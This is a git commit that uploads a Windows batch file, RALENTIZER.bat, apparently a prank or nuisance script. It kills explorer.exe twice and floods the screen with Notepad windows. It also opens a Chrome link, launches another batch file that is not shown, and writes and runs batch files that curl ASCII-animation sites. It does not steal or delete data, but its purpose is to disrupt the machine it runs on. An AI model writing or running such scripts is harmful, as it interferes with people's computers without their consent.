ce83ab8055bfbd366915fda9ebb897771710ebad
Fred7800wzr <167916912+Fred7800wzr@users.noreply.github.com>
2024-08-05 17:31:21 +0200

    Add files via upload

---
+++ RALENTIZER.bat
@@ -0,0 +1,29 @@
+@echo off
+taskkill /f /im explorer.exe
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start notepad /.setup
+start chrome https://blogs.mtdv.me/iPOD
+start a.bat
+start a.bat
+timeout 1 >nul
+taskkill /f /im explorer.exe
+start chrome https://blogs.mtdv.me/iPOD
+echo curl parrot.live >> parrot.bat
+echo curl ascii.live/can-you-hear-me >> wee.bat
+timeout 2 >nul
+start parrot.bat
+start wee.bat
